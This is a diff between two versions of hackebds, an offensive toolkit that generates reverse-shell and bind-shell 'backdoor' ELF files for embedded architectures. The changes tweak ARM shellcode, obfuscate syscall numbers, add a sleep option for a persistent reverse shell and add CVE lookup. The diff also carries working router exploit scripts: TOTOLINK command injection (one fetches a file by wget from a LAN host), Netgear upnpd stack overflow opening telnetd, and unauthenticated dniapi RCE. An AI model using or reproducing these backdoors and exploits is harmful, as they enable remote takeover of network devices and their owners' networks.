 	mov r2,#0x10
 	add r7,r7,#2
-	svc #1
+	svc #0
 	mov r0,r6
 	eor r1,r1,r1
 	mov r7,#63
-	svc #1
+	svc #0
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc #0
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc #0
 	mov r0,r4
 	eor r1,r1,r1
 	eor r2,r2,r2
 	push {r1}
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #1
+	svc #0
 
 	'''
 	elif shell_path == "/bin/sh" or shell_path == "sh":
 		shellcode='''
 	.ARM
 	eor r4,r4,r4
 	%s
@@ -688,17 +685,14 @@
 	mov r7,#0x69
 	strb r7,[sp,#-0x1f]
 	mov r7,#0x2d
 	strb r7,[sp,#-0x20]
 	add r4,sp,#-0x1b
 	add r5,sp,#-0x2c
 	add r8,sp,#-0x20
-	add r3,pc,#1
-	bx  r3
-	.THUMB
 	mov r1,#2
 	mov r0,r1
 	mov r1,#1
 	eor r2,r2,r2
 	mov r7,#200
 	add r7,r7,#81
 	svc #1
@@ -749,15 +743,15 @@
 		else:
 			handle_port[i]="eor r7,r7,r7"
 
 	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],handle_port[0],handle_port[1])
 	#print shellcode
 	#str(u8(handle_port[0])),str(u8(handle_port[1])
 	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
-	shellcode=asm(shellcode)[:-2]
+	shellcode=asm(shellcode)
 	ELF_data = make_elf(shellcode)
 	if filename==None:
 		log.info("waiting 3s")
 		sleep(1)
 		filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,chars)
 		f=open(filename,"wb")
 		f.write(ELF_data)
@@ -1270,47 +1264,44 @@
 	mov r7,#0x69
 	strb r7,[sp,#-0x1f]
 	mov r7,#0x2d
 	strb r7,[sp,#-0x20]
 	add r4,sp,#-0x1d
 	add r8,sp,#-0x20
 	add r5,sp,#-0x2c
-	add r3,pc,#1
-	bx  r3
-	.THUMB
 	mov r1,#2
 	mov r0,r1
 	mov r1,#1
 	eor r2,r2,r2
 	mov r7,#200
 	add r7,r7,#81
-	svc #1
+	svc #0
 	mov r6,r0
 	mov r1,r5
 	mov r2,#0x10
 	add r7,r7,#2
-	svc #1
+	svc #0
 	mov r0,r6
 	eor r1,r1,r1
 	mov r7,#63
-	svc #1
+	svc #0
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc #0
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc #0
 	mov r0,r4
 	eor r1,r1,r1
 	eor r2,r2,r2
 	push {r1}
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #1
+	svc #0
 	'''
 	elif shell_path == "/bin/sh" or shell_path == "sh":
 		shellcode = '''
 	.ARM
 	eor r4,r4,r4
 	%s
 	strb r7,[sp,#-0x28]
@@ -1347,47 +1338,45 @@
 	mov r7,#0x69
 	strb r7,[sp,#-0x1f]
 	mov r7,#0x2d
 	strb r7,[sp,#-0x20]
 	add r8,sp,#-0x20
 	add r4,sp,#-0x1b
 	add r5,sp,#-0x2c
-	add r3,pc,#1
-	bx  r3
-	.THUMB
+
 	mov r1,#2
 	mov r0,r1
 	mov r1,#1
 	eor r2,r2,r2
 	mov r7,#200
 	add r7,r7,#81
-	svc #1
+	svc #0
 	mov r6,r0
 	mov r1,r5
 	mov r2,#0x10
 	add r7,r7,#2
-	svc #1
+	svc #0
 	mov r0,r6
 	eor r1,r1,r1
 	mov r7,#63
-	svc #1
+	svc #0
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc #0
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc #0
 	mov r0,r4
 	eor r1,r1,r1
 	eor r2,r2,r2
 	push {r1}
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #1
+	svc #0
 	'''
 	else:
 		log.info("now shell is only support sh and bash")
 		return 
 	if(envp == None):
 		envp = 0
 	else:
@@ -1407,15 +1396,15 @@
 		else:
 			handle_port[i]="eor r7,r7,r7"
 
 	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],handle_port[1],handle_port[0])
 	#print shellcode
 	#str(u8(handle_port[0])),str(u8(handle_port[1])
 	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
-	shellcode=asm(shellcode)[:-2]
+	shellcode=asm(shellcode)
 	ELF_data = make_elf(shellcode)
 	if filename==None:
 		log.info("waiting 3s")
 		sleep(1)
 		filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,chars)
 		f=open(filename,"wb")
 		f.write(ELF_data)
@@ -4320,42 +4309,42 @@
 	mov r7,#0x69
 	strb r7,[sp,#-0x1f]
 	mov r7,#0x2d
 	strb r7,[sp,#-0x20]
 	add r8,sp,#-0x20
 	add r4,sp,#-0x1b
 	add r5,sp,#-0x2c
-	add r3,pc,#1
-	bx  r3
-	.THUMB
 	'''
 
 	shellcode += '''
 	mov  r0, #2
     mov  r1, #1
     eor  r2, r2 ,r2/* 0 (#0) */
-    /* call socket() */
-    mov r7, #SYS_socket /* 0x119 */
+    mov r7, #0xff /* 0x119 */
+    add r7,r7,0x1a
     svc  #0
 	'''
 
 	shellcode += bind_shellcode
 
 	shellcode +='''
 	mov  r1,sp
 	mov  r2,#0x10  
-	mov r7, 0x11a
+	mov r7,#0xff
+	add r7,r7,0x1b
 	svc #0
 	mov r0,r6
 	eor r1,r1
-	mov r7,#284
+	mov r7,#0xff
+	add r7,r7,29
 	svc #0
 	mov r0,r6
 	eor r2,r2
-	mov r7, 0x11d
+	mov r7, #0xff
+	add r7,r7,30
     svc #0
     mov r6,r0
 	mov r7,#0x20
 	strb r7,[sp,#-0x30]
 	mov r7,#0x3a
 	strb r7,[sp,#-0x31]
 	mov r7,#0x64
@@ -4382,21 +4371,21 @@
 	mov  r1, sp
 	mov  r2, #%s
 	mov  r7, #3
 	svc  #0
 	mov r0,r6
 	eor r1,r1,r1
 	mov r7,#63
-	svc #1
+	svc #0
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc #0
 	mov r0,r6
 	add r1,r1,#1
-	svc #1
+	svc #0
 	mov  r7,sp
 	ldr  r1,[r7]
 	'''
 
 	shellcode += pass_cmd_shellcode
 
 	shellcode += '''
@@ -4406,15 +4395,15 @@
 	eor r1,r1,r1
 	eor r2,r2,r2
 	strb r2, [sp,#0x20]
 	push {r1}
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #1
+	svc #0
 	'''
 	shellcode = shellcode % ( passwd_len)
 
 
 	shellcode += '''
 main_exit:
 	'''
@@ -4531,17 +4520,14 @@
 	mov r7,#0x69
 	strb r7,[sp,#-0x1f]
 	mov r7,#0x2d
 	strb r7,[sp,#-0x20]
 	add r8,sp,#-0x20
 	add r4,sp,#-0x1b
 	add r5,sp,#-0x2c
-	add r3,pc,#1
-	bx  r3
-	.THUMB
 	'''
 
 	shellcode += '''
 	mov  r0, #2
     mov  r1, #1
     eor  r2, r2 ,r2/* 0 (#0) */
     /* call socket() */
@@ -4628,15 +4614,15 @@
 	eor r1,r1,r1
 	eor r2,r2,r2
 	strb r2, [sp,#0x20]
 	push {r1}
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #1
+	svc #0
 	'''
 
 	shellcode += '''
 	main_exit:
 	'''
 
 	shellcode += shellcraft.exit(0)
@@ -4828,15 +4814,15 @@
 	context.arch = 'mips64'
 	context.endian = 'big'
 	context.bits = '64'
 	return mips64el.sh()
 '''
 
 def get_version():
-    return Fore.GREEN+"Version: 0.3.6"+Fore.RESET
+    return Fore.GREEN+"Version: 0.3.7"+Fore.RESET
 
 
 '''
 print model and arch list
 '''
 
 def model_list():
@@ -5041,17 +5027,17 @@
 	return fun(listen_port, passwd, filename)
 
 def num_get_file_cmd(number, CMD_PATH,CMD, envp,filename):
 	fun = hackebds_cmd_dic.get(number)
 	return fun(CMD, CMD_PATH , envp, filename)
 
 
-def num_get_power_reverse_shell(num, shell_path ,reverse_ip, reverse_port, envp ,filename):
+def num_get_power_reverse_shell(num, shell_path ,reverse_ip, reverse_port, envp , sleep_time,filename):
 	fun = power_reverse_shell.get(num)
-	return fun(shell_path, reverse_ip, reverse_port, envp,filename)
+	return fun(shell_path, reverse_ip, reverse_port, envp, sleep_time,filename)
 
 def num_get_power_bind_shell(num, shell_path, listen_port, passwd, envp,filename):
 	fun = power_bind_shell_dic.get(num)
 	return fun(shell_path, listen_port, passwd, envp,filename)
 
 
 def check_ip(strip):
@@ -5082,24 +5068,28 @@
 	parser.add_argument('-passwd', required=False, type=str,default="1234", help='bind_shell set connect passwd')
 	parser.add_argument('-model', required=False, type=str ,default=None, help='device model,learn module')
 	parser.add_argument('-bind_port', required=False, type=int,default=None, help='bind_shell port')
 	parser.add_argument('-filename', required=False, type=str,default=None, help='Generate file name')
 	parser.add_argument('-shell', required=False, type=str,default="/bin/sh", help='cmd shell or execute file path')
 	parser.add_argument('-cmd', required=False, type=str,default=None, help='Commands executed')
 	parser.add_argument('-envp', required=False, type=str,default=None, help='Commands envp')
+	parser.add_argument('-sleep', required=False, type=int,default=5, help='the interval time in the continuous bounce shell, in seconds default is 5')
 	parser.add_argument('-encode', '--encode' ,action='store_true', help='encode backdoor')
 	parser.add_argument('-power', '--power' ,action='store_true',help='powerful reverse shell_file or bind_shell file')
 	parser.add_argument('-s', '--search' ,action='store_true',help='Basic information and POC of search device')
 	parser.add_argument('-l', '--list' ,action='store_true',help='print model information list')
 	parser.add_argument('-p', '--poc' ,action='store_true',help='generated model\'s POC file')
 	parser.add_argument('-v', '--version' ,action='version', version=get_version(), help='Display version')
+	parser.add_argument('-CVE', '--CVE', required=False, type=str, default=None, help='CVE ID')
 	parser.add_argument('-add', '--add_model', action='store_true', help='Add model tree\'s node')
 	flag_cve_info = 0
 	#@with_argparser(argparse)
 	args = parser.parse_args()
+	if(args.sleep <0 or args.sleep>36000000):
+		args.sleep = 5
 	log.info("Initialize data file")
 #try:
 	if (os.path.exists(model_choise.model_tree_info_dicname) == True):
 		model_choise.data_base_init()
 		model_choise.dic_model_tree()
 		model_choise.model_tree_dic()
 	else:
@@ -5109,14 +5099,15 @@
 #except Exception as e:
 #	print(e)
 #	log.info("Initialization fail")
 	#except:
 	#	print(e)
 	#	log.info("Initialization fail")
 	log.success("Initialization completed")
+	#model_choise.demo_test()
 	if (os.access("/tmp/hackebds_model_table", os.F_OK | os.R_OK | os.W_OK)):
 		pass
 	else:
 		try:
 			model_choise.touchfile()
 		except Exception as e:
 			args.model = None
@@ -5137,14 +5128,17 @@
 		if (args.poc == True and args.model != None):
 			model_search_res = model_choise.search_model(args.model)
 			model_choise.get_poc(model_search_res)
 			return
 		if (args.search == True):
 			model_choise.search_model(args.model)
 			return
+	
+	if args.model == None and args.CVE!= None:
+		model_choise.search_CVE(args.CVE)
 
 	if (args.res == None ):
 		log.info("please use -h View Help")
 		return
 
 	if(args.arch != None and args.model != None):
 		flag_cve_info = 1
@@ -5173,28 +5167,28 @@
 			model_choise.print_mmodel_dic()
 
 	if (args.model != None and args.arch==None):
 		try:
 			flag_cve_info  = 1
 			args.arch = model_choise.model_to_arch(args.model)
 			log.success("found relationship {} ------>{}".format(args.model, args.arch))
-			model_choise.print_mmodel_dic()
+			#model_choise.print_mmodel_dic()
 		except:
 			log.info("There is no cross reference relationship locally, please set -arch building relationships, can be edited manually /tmp/hackebds_model_table")
 			return
 
 	if(args.model == None and args.arch==None):
 		log.info("please set arch or model")
 		return
 
 	if (args.res == "reverse_shell_file" and args.arch != None and args.encode == False ):
 		if (args.reverse_ip!=None and args.reverse_port != None):
 			if (check_ip(args.reverse_ip)==True and check_port(args.reverse_port)==True):
 				if(args.power == True):
-					num_get_power_reverse_shell(arch_get_number(args.arch), args.shell,args.reverse_ip, args.reverse_port, args.envp ,args.filename)
+					num_get_power_reverse_shell(arch_get_number(args.arch), args.shell,args.reverse_ip, args.reverse_port, args.envp , hex(args.sleep) ,args.filename)
 					return
 				else:
 					try:
 						num_getreverse_file(arch_get_number(args.arch), args.shell ,args.reverse_ip, args.reverse_port, args.envp ,args.filename)
 						return
 
 					except Exception as e:
```

### Comparing `hackebds-0.3.6/hackebds/my_package.py` & `hackebds-0.3.7/hackebds/my_package.py`

 * *Files 0% similar despite different names*

```diff
@@ -318,15 +318,15 @@
 				else:
 					if(check_root() == True):
 						subprocess.check_output(["wget", "-O", "/usr/bin/mipsn32el-linux-gnu-ld", "-T", "10", "-t", "3","https://github.com/doudoudedi/hackEmbedded/raw/main/cross-tools/mipsn32el-linux-gnu-ld"],shell=False)
 						os.system("chmod 111 /usr/bin/mipsn32el-linux-gnu-ld")
 					else:
 						log.info("root user is required")
 						return 1
-					log.success("mipsn32-linux-gnu-as download success")
+					log.success("mipsn32el-linux-gnu-as download success")
 			except:
 				log.info("check your netwrok or download https://github.com/doudoudedi/hackEmbedded/tree/main/cross-tools")
 				return 1
 			try:
 				if(os.path.exists("/usr/bin/mipsn32el-linux-gnu-as") == True):
 					try:
 						cmd_out = subprocess.Popen(['readelf','-h', "/usr/bin/mipsn32el-linux-gnu-as"], shell=False, stdout=PIPE, stderr = PIPE).stderr.read()
@@ -349,15 +349,14 @@
 						log.info("root user is required")
 						return 1
 					log.success("mipsn32el-linux-gnu-as download success")
 			except:
 				log.info("check your netwrok or download https://github.com/doudoudedi/hackEmbedded/tree/main/cross-tools")
 				return 1
 			log.success("mipsn32el cross tool is ready")
-
 		#subprocess.Popen("mv","./mipsn32-linux-gnu-as","/usr/bin")
 		if(check_root() == True):
 			if(os.path.exists("/tmp/mipsn32_binutils")==False and check_mipsn32_envir()==2):
 				try:
 					os.system("mkdir -p /tmp/mipsn32_binutils;cp /usr/bin/mipsn32-linux-gnu-as /tmp/mipsn32_binutils;cp /usr/bin/mipsn32-linux-gnu-ld /tmp/mipsn32_binutils;cp /usr/bin/mipsn32el-linux-gnu-as /tmp/mipsn32_binutils;cp /usr/bin/mipsn32el-linux-gnu-ld /tmp/mipsn32_binutils")
 					os.system("echo \"export PATH=\$PATH:/tmp/mipsn32_binutils\" >> ~/.bashrc")
 					log.success("mipsn32_binutils write environment variable succeeded ")
```

### Comparing `hackebds-0.3.6/hackebds/power_bind_shell.py` & `hackebds-0.3.7/hackebds/power_bind_shell.py`

 * *Files 1% similar despite different names*

```diff
@@ -2112,17 +2112,14 @@
 		mov r7,#0x69
 		strb r7,[sp,#-0x1f]
 		mov r7,#0x2d
 		strb r7,[sp,#-0x20]
 		add r10,sp,#-0x1d
 		add r5,sp,#-0x2c
 		add r8,sp,#-0x20
-		add r3,pc,#1
-		bx  r3
-		.THUMB
 		main:
 		'''
 	elif shell_path == "/bin/sh" or shell_path == "sh":
 		shellcode='''
 	.section .shellcode,"awx"
 	.global _start
 	.global __start
@@ -2152,17 +2149,14 @@
 	mov r7,#0x69
 	strb r7,[sp,#-0x1f]
 	mov r7,#0x2d
 	strb r7,[sp,#-0x20]
 	add r10,sp,#-0x1b
 	add r5,sp,#-0x2c
 	add r8,sp,#-0x20
-	add r3,pc,#1
-	bx  r3
-	.THUMB
 	main:
 	'''
 	else:
 		log.info("now shell is only support sh and bash")
 		return 
 	if(envp == None):
 		envp = 0
@@ -2178,15 +2172,16 @@
 	'''
 
 	shellcode += '''
 	mov  r0, #2
     mov  r1, #1
     eor  r2, r2 ,r2/* 0 (#0) */
     /* call socket() */
-    mov r7, #SYS_socket /* 0x119 */
+    mov r7, #0xff /* 0x119 */
+    add r7,r7,0x1a
     svc  #0
 	'''
 
 	shellcode
 
 	shellcode += '''
 	mov r6, r0
@@ -2194,36 +2189,40 @@
 
 	shellcode +='''
 	mov  r1, #1
 	mov  r2, #0xf
 	mov  r3, sp
 	mov  r4, #4
 	/* call setsockopt() */
-	mov r7, #SYS_setsockopt /* 0x126 */
+	mov r7, #0xff
+	add r7, r7,#39
 	svc  0
 	'''
 
 	shellcode += '''
 	eor  r2, r2, r2
 	mov  r0, r6
 	'''
 	shellcode += bind_shellcode
 
 	shellcode +='''
 	mov  r1,sp
 	mov  r2,#0x10  
-	movw r7, 0x11a
+	mov r7,#0xff
+	add r7,r7,0x1b
 	svc #0
 	mov r0,r6
 	eor r1,r1
-	movw r7,#284
+	mov r7,#0xff
+	add r7,r7,29
 	svc #0
 	mov r0,r6
 	eor r2,r2
-	movw r7, 0x11d
+	mov r7, #0xff
+	add r7,r7,30
 	svc #0
 	mov r6,r0
 
 	mov r1,#2
 	mov r0,r6
 	mov r7,#63
 	svc #0
@@ -2280,15 +2279,15 @@
 	eor r1,r1,r1
 	eor r2,r2,r2
 	strb r2, [sp,#0x20]
 	push {r1}
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #1
+	svc #0
 	'''
 	shellcode = shellcode % (passwd_len)
 
 	shellcode += '''
 main_exit:
 	'''
 
@@ -2414,17 +2413,14 @@
 	mov r7,#0x69
 	strb r7,[sp,#-0x1f]
 	mov r7,#0x2d
 	strb r7,[sp,#-0x20]
 	add r8,sp,#-0x20
 	add r10,sp,#-0x1b
 	add r5,sp,#-0x2c
-	add r3,pc,#1
-	bx  r3
-	.THUMB
 	main:
 	'''
 
 	elif shell_path == "/bin/bash" or shell_path == "bash":
 		shellcode = '''
 		.section .shellcode,"awx"
 		.global _start
@@ -2459,17 +2455,14 @@
 		mov r7,#0x69
 		strb r7,[sp,#-0x1f]
 		mov r7,#0x2d
 		strb r7,[sp,#-0x20]
 		add r10,sp,#-0x1d
 		add r5,sp,#-0x2c
 		add r8,sp,#-0x20
-		add r3,pc,#1
-		bx  r3
-		.THUMB
 		main:
 		'''
 	else:
 		log.info("now shell is only support sh and bash")
 		return 
 	if(envp == None):
 		envp = 0
@@ -2484,16 +2477,16 @@
 	bne main_lab
 	'''
 
 	shellcode += '''
 	mov  r0, #2
     mov  r1, #1
     eor  r2, r2 ,r2/* 0 (#0) */
-    /* call socket() */
-    mov r7, #SYS_socket /* 0x119 */
+    mov r7, #0xff /* 0x119 */
+    add r7,r7,0x1a
     svc  #0
 	'''
 
 	shellcode += '''
 	mov r6, r0
 	'''
 
@@ -2516,23 +2509,26 @@
 	shellcode += bind_shellcode
 
 
 
 	shellcode +='''
 	mov  r1,sp
 	mov  r2,#0x10  
-	mov r7, 0x11a
+	mov r7,#0xff
+	add r7,r7,0x1b
 	svc #0
 	mov r0,r6
 	eor r1,r1
-	mov r7,#284
+	mov r7,#0xff
+	add r7,r7,29
 	svc #0
 	mov r0,r6
 	eor r2,r2
-	mov r7, 0x11d
+	mov r7, #0xff
+	add r7,r7,30
 	svc #0
 	mov r6,r0
 
 	mov r1,#2
 	mov r0,r6
 	mov r7,#63
 	svc #0
@@ -2595,15 +2591,15 @@
 	eor r1,r1,r1
 	eor r2,r2,r2
 	strb r2, [sp,#0x20]
 	push {r1}
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #1
+	svc #0
 	'''
 
 	shellcode += '''
 	main_exit:
 	'''
 
 	shellcode += shellcraft.exit(0)
@@ -2815,19 +2811,19 @@
 				context.bits="32"
 				context.endian="little"
 			else:
 				return 
 
 
 
-def sparc_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=None):
+def sparc_power_bind_shell(shell_path ,listen_port, passwd, envp ,sleep_time,filename=None):
 	pass
 
 
-def spac64_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=None):
+def spac64_power_bind_shell(shell_path ,listen_port, passwd, envp ,sleep_time ,filename=None):
 	pass
 
 
 
 
 def x64_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=None):
 	context.arch = 'amd64'
```

### Comparing `hackebds-0.3.6/hackebds/ESH.py` & `hackebds-0.3.7/hackebds/ESH.py`

 * *Files identical despite different names*

### Comparing `hackebds-0.3.6/hackebds/arm.py` & `hackebds-0.3.7/hackebds/arm.py`

 * *Files identical despite different names*

### Comparing `hackebds-0.3.6/hackebds/backdoor_encode.py` & `hackebds-0.3.7/hackebds/backdoor_encode.py`

 * *Files identical despite different names*

### Comparing `hackebds-0.3.6/hackebds/exp_database.py` & `hackebds-0.3.7/hackebds/exp_database.py`

 * *Files 10% similar despite different names*

```diff
@@ -29,28 +29,29 @@
     "X-Requested-With":"XMLHttpRequest",
     "Origin":"http://%s:%s"%(ip,port),
 }
 data={
     "topicurl":"setting/setLanguageCfg",
     "langType":"cn;{};".format(cmd),
     "langFlag":"0"
+    }
 
 print(requests.post(url,headers=headers,data=json.dumps(data)).text)
 '''], 
     "stack_overflow":["SESSION_ID stackoverflow",
 """
 #from b0ldfrev poc
 #affect V4.1cu.4154
 import requests
 import urllib3
 import sys
 from struct import pack
 
 if len(sys.argv)!=4:
-	print "Parameter error. python exp.py url ulibc_base \\"command\\"\\ntips:Use the && symbol spacing command"
+	print("Parameter error. python exp.py url ulibc_base \\"command\\"\\ntips:Use the && symbol spacing command")
 	exit(0)
 
 url = sys.argv[1]
 base =  int(sys.argv[2],16)
 cmd= sys.argv[3]
 
 
@@ -94,15 +95,15 @@
 import requests
 import urllib3
 import sys
 from struct import pack
 
 
 if len(sys.argv)!=4:
-    print "Parameter error. python exp.py url uClibc_base \\"command\\"\\ntips:Use the & symbol spacing command"
+    print("Parameter error. python exp.py url uClibc_base \\"command\\"\\ntips:Use the & symbol spacing command")
     exit(0)
 
 url = sys.argv[1]
 base =  int(sys.argv[2],16)
 cmd= sys.argv[3]
 
 
@@ -144,15 +145,15 @@
 # affect firmware version <1.0.01.02
 import requests
 import sys
 import base64
 import urllib3
 
 if len(sys.argv)!=3:
-   print "Parameter error. python exp.py url \\"command\\""
+   print("Parameter error. python exp.py url \\"command\\"")
    exit(0)
 
 url = sys.argv[1]
 cmd =  sys.argv[2]
 
 CMD=";"+cmd+";"
 CMD=base64.b64encode(CMD)
@@ -161,25 +162,25 @@
 
 urllib3.disable_warnings()
 
 if url[-1:]=='/':
   url=url[:-1]
 r = requests.get(url+"/download/dniapi/", headers=header,verify=False)
 
-print "DONE!"
+print("DONE!")
 """],
     "CVE-2021-1602":["(Unauth RCE without parameters can be executed like CVE-2021-1289)",
 """
 import requests
 import sys
 import base64
 import urllib3
 
 if len(sys.argv)!=3:
-   print "Parameter error. python exp.py url \\"command with no parameters\\""
+   print("Parameter error. python exp.py url \\"command with no parameters\\"")
    exit(0)
 
 url = sys.argv[1]
 cmd =  sys.argv[2]
 
 CMD="\\n"+cmd+"\\n"
 CMD=base64.b64encode(CMD)
@@ -188,15 +189,15 @@
 
 urllib3.disable_warnings()
 
 if url[-1:]=='/':
   url=url[:-1]
 r = requests.get(url+"/download/dniapi/", headers=header,verify=False)
 
-print "DONE!"
+print("DONE!")
 """]}
 
 model_exp_dic["TOTOLINK_N600R"] = {
     "CVE-2022-26186": ["TOTOLINK N600R V4.3.0cu.7570_B20200620 was discovered to contain a command injection vulnerability via the exportOvpn interface at cstecgi.cgi",
 '''
 #affect V4.3.0cu.7570
 POST /cgi-bin/cstecgi.cgi?exportOvpn=&type=user&comand=;touch${IFS}1.txt;&filetype=gz HTTP/1.1
@@ -218,16 +219,16 @@
 import sys
 import requests
 import json
 try:
     ip=sys.argv[1]
     port=sys.argv[2]
 except:
-    print "nonono! cant't do this"
-    print "please use python exp.py [ip] [port] [command]"
+    print("nonono! cant't do this")
+    print("please use python exp.py [ip] [port] [command]")
     exit()
 url="http://%s:%s/cgi-bin/cstecgi.cgi"%(ip,port)
 command='ls -al'
 headers={
     "User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
     "Accept-Language":"en-US,en;q=0.5",
     "Accept-Encoding":"gzip, deflate",
@@ -249,16 +250,16 @@
 import requests
 import json
 try:
     ip=sys.argv[1]
     port=sys.argv[2]
     command=sys.argv[3]
 except:
-    print "nonono! cant't do this"
-    print "please use python exp.py [ip] [port] [command]"
+    print("nonono! cant't do this")
+    print("please use python exp.py [ip] [port] [command]")
     exit()
 url="http://%s:%s/cgi-bin/cstecgi.cgi"%(ip,port)
 headers={
     "User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
     "Accept-Language":"en-US,en;q=0.5",
     "Accept-Encoding":"gzip, deflate",
     "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
@@ -278,16 +279,16 @@
 import requests
 import json
 try:
     ip=sys.argv[1]
     port=sys.argv[2]
     command=sys.argv[3]
 except:
-    print "nonono! cant't do this"
-    print "please use python exp.py [ip] [port] [command]"
+    print("nonono! cant't do this")
+    print("please use python exp.py [ip] [port] [command]")
     exit()
 url="http://%s:%s/cgi-bin/cstecgi.cgi"%(ip,port)
 headers={
     "User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
     "Accept-Language":"en-US,en;q=0.5",
     "Accept-Encoding":"gzip, deflate",
     "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
@@ -304,15 +305,84 @@
 model_exp_dic["TOTOLINK_EX200"] = {
     'CVE-2021-43711':
 ["The downloadFlile.cgi binary file in TOTOLINK EX200 V4.0.3c.7646_B20201211 has a command injection vulnerability when receiving GET parameters. The parameter name can be constructed for unauthenticated command execution.\n['https://github.com/doudoudedi/ToTolink_EX200_Cmmand_Execute/blob/main/ToTolink%20EX200%20Comand%20Injection2.md']", '\nGET /cgi-bin/downloadFlile.cgi?;wget${IFS}http://192.168.0.111:801/mm.txt;=hahah HTTP/1.1\n\nHost: 192.168.0.254\n\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n\nAccept-Language: en-US,en;q=0.5\n\nAccept-Encoding: gzip, deflate\n\nConnection: close\n\nUpgrade-Insecure-Requests: 1\n']
 }
 
 model_exp_dic["Netgear_EX6100v1"] = {
     "CVE-2022-24655":
-["A stack overflow vulnerability exists in the upnpd service in Netgear EX6100v1 201.0.2.28, CAX80 2.1.2.6, and DC112A 1.0.0.62, which may lead to the execution of arbitrary code without authentication.\n['https://github.com/doudoudedi/Netgear_product_stack_overflow/blob/main/NETGEAR%20EX%20series%20upnpd%20stack_overflow.md', 'https://kb.netgear.com/000064615/Security-Advisory-for-Pre-Authentication-Command-Injection-on-EX6100v1-and-Pre-Authentication-Stack-Overflow-on-Multiple-Products-PSV-2021-0282-PSV-2021-0288', 'https://www.netgear.com/about/security/']", '\n#Aouth:doudoudedi\n#please pip install pwn\nfrom pwn import *\nimport sys\nimport os\nchoice=0\nrequest=\'\'\ntry:\n    target_ip=sys.argv[1]\n    target_version=sys.argv[2]\nexcept:\n    print("python ./exp.py ipaddress id")\n    print("if you firmware version is EX6100-V1.0.2.28_1.1.138.chk or please EX6100-V1.0.2.28_1.1.136 id is 1")\n    print("if you firmware version is EX6100-V1.0.2.24_1.1.134.chk id is 2")\n    exit(0)\n\ndef generate_payload():\n    global target_version,request,choice\n    if target_version=="1": \n            system_addr=0x00422848\n            change_password=0x042C550\n    if target_version=="2":\n            system_addr=0x422828\n            change_password=0x042C530\n    aim=0\n    print("1.open telnetd 25\\n2.change http password (NULL)")\n    choice=int(input())\n    if(choice==1):\n    aim=system_addr\n    request = b"SUBSCRIBE /gena.telnetd${IFS}-p${IFS}25;?service=" + b"1" + b" HTTP/1.0\\n"\n    request += b"Host: " + b"192.168.1.0:" + b"80" + b"\\n"\n    request += b"Callback: <http://192.168.0.4:34033/ServiceProxy27>\\n"\n    request += b"NT: upnp:event\\n"\n    request += b"Timeout: Second-1800\\n"\n    request += b"Accept-Encoding: gzip, deflate\\n"\n    request += request+b"doud"\n    request += request\n    request = request.ljust(0x1f00,b"a")\n    request += p32(0x7fff7030)\n    request = request.ljust(0x1f48-0x14,b"a")\n    request += p32(aim)\n    if(choice==2):\n    aim=change_password\n    request = b"SUBSCRIBE /gena.telnetd${IFS}-p${IFS}25;?service=" + b"1" + b" HTTP/1.0\\n"\n    request += b"Host: " + b"192.168.1.0:" + b"80" + b"\\n"\n    request += b"Callback: <http://192.168.0.4:34033/ServiceProxy27>\\n"\n    request += b"NT: upnp:event\\n"\n    request += b"Timeout: Second-1800\\n"\n    request += b"Accept-Encoding: gzip, deflate\\n"\n    request += request+b"doud"\n    request += request\n    request = request.ljust(0x1f00,b"a")\n    request += p32(0x7fff7030)\n    request += p32(0x7fff7030)*12\n    request += p32(0x42C550)\n    request += p32(aim)\n\n\ndef attack():\n    p=remote(target_ip,5000)\n    p.send(request)\n    if(choice==1):\n    os.system("telnet %s 25"%(target_ip))\n    #p.interactive()\n#request += p32(0x422944)\n#request += "a"*0x500\n#request += p32(0x7fff7030)*8\nif __name__=="__main__":\n    generate_payload()\n    attack()\n']
+["A stack overflow vulnerability exists in the upnpd service in Netgear EX6100v1 201.0.2.28, CAX80 2.1.2.6, and DC112A 1.0.0.62, which may lead to the execution of arbitrary code without authentication.\n['https://github.com/doudoudedi/Netgear_product_stack_overflow/blob/main/NETGEAR%20EX%20series%20upnpd%20stack_overflow.md', 'https://kb.netgear.com/000064615/Security-Advisory-for-Pre-Authentication-Command-Injection-on-EX6100v1-and-Pre-Authentication-Stack-Overflow-on-Multiple-Products-PSV-2021-0282-PSV-2021-0288', 'https://www.netgear.com/about/security/']", 
+"""
+#Aouth:doudoudedi
+#please pip install pwn
+from pwn import *
+import sys
+import os
+choice=0
+request=''
+try:
+    target_ip=sys.argv[1]
+    target_version=sys.argv[2]
+except:
+    print("python ./exp.py ipaddress id")
